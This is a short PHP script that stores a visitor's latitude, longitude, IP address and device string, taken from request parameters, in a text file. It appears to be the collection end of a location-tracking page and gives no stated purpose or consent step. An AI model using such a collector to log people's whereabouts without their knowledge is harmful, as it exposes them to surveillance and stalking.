<?php
$myfile = fopen("location.txt", "w");
$txt = "location:" . $_GET["lat"] . "," . $_GET["long"] ."\nip:" . $_SERVER["REMOTE_ADDR"] . "\nDevice:" . $_GET["uagent"];
fwrite($myfile, $txt);
fclose($myfile);


?>